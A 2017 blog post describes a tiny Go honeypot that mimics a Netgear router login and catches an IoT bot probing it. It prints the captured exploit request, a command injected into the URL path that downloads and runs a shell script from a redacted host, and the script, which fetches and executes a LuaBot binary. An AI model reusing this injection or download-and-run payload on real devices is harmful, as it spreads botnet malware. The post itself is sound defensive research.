---
title: "Honeypotting for the Lazy: Weekend Fishing for Router Bots"
date: 2017-01-07T17:05:56+01:00
---

Recently I decided that I wanted to do a bit more malware analysis. I have a reverse engineering background of sorts, so I wasn’t so concerned with the mechanics of analysing the malware as I was with the question of how do I actually find a sample to analyse that is interesting to me and answers some sort of actual question, rather than purely being a learning exercise?

This happened to be a day or so after [the Netgear vulnerability affecting their consumer routers](https://nakedsecurity.sophos.com/2016/12/12/netgear-routers-have-gaping-remote-access-hole/) was released to the public and gave me a question to answer - would the IoT botnet authors add support for this vulnerability to their bots?

An important thing to realise about me: I’m incredibly lazy. I didn’t feel like learning to use complicated honeypotting tools or setting up a massive amount of infrastructure, just to answer a throwaway question I had on the weekend. So this presented another question: how could I fish for this malware as lazily as possible?

So with a fine Cornish cider in hand I wrote possibly the crappiest emulation of a router ever. It’s a 21-line Go program that looks like so:

```
package main

import (
    "net/http"
    "log"
)

func HelloServer(w http.ResponseWriter, req *http.Request) {
    log.Print(req)
    w.Header().Set("Content-Type", "text/html")
    w.Header()["WWW-Authenticate"] = []string{"Basic realm=\"NETGEAR R7000\""}
    w.WriteHeader(401)
}

func main() {
    http.HandleFunc("/", HelloServer)
    err := http.ListenAndServeTLS(":8443", "netgear.crt", "netgear.key", nil)
    if err != nil {
        log.Fatal("ListenAndServe: ", err)
    }
}
```

It listens on port 8443, like the real device, and looks on the surface about as much like the device as I could be bothered to make it look. It’s definitely not perfect! The headers are returned in the wrong order, it returns some headers the real device doesn’t, because Go’s net/http package added them and I was too lazy to work out how to remove them, the SSL certificate is just a self signed one I made with the same fields as the real Netgear certificate, and so on.

But I figured it might be good enough to fool an automated scanner, which is probably just looking for a string somewhere. And I was right!

I deployed this to a DigitalOcean VM that I had lying around, and then, because this device would usually be running on consumer/office ISP’s and not datacentres, had a few kind friends forward incoming traffic to their IP’s on port 8443 to my new VM.

A day or two later, something bit:

```
2016/12/13 12:17:54 &{GET / HTTP/1.1 1 1 map[Connection:[close] User-Agent:[Scanbot]] 0x8762b0 0 [] false REDACTED map[] map[] <nil> map[] REDACTED:52268 / 0xc21006fa80}
2016/12/13 12:17:55 &{GET /cgi-bin/;cd$IFS%22var%22;curl$IFS%22REDACTED:7778%22$IFS%22-o%22$IFS%22nya.sh%22;sh$IFS%22nya.sh%22 HTTP/1.1 1 1 map[Connection:[close] User-Agent:[Scanbot]] 0x8762b0 0 [] false REDACTED map[] map[] <nil> map[] REDACTED:54482 /cgi-bin/;cd$IFS"var";curl$IFS"REDACTED:7778"$IFS"-o"$IFS"nya.sh";sh$IFS"nya.sh" 0xc2100af660}
```

As you can see, the output is disgusting - because I just dumped Go’s object straight to the log. Lazy, remember.

But, we clearly have evidence here of something hitting us to determine if we are a Netgear and then attempting to exploit the vulnerability. Let’s take a look at the script:

```
curl http://REDACTED/arm_lsb > /var/nya
chmod 777 /var/nya
/var/nya
```

Yep, looks like some kind of IoT malware to me. And it was - if you’re interested, it turns out to be LuaBot, as described previously [here](http://blog.malwaremustdie.org/2016/09/mmd-0057-2016-new-elf-botnet-linuxluabot.html).

So, while not exactly a success at finding the worlds next superbug, my little weekend experiment did show that you don’t need to be a big shot researcher with budget and tools to match to go do stuff - just go do stuff. In a really hacky way if you want to, you can still go out and do stuff, even if you aren’t leet or are just really lazy.
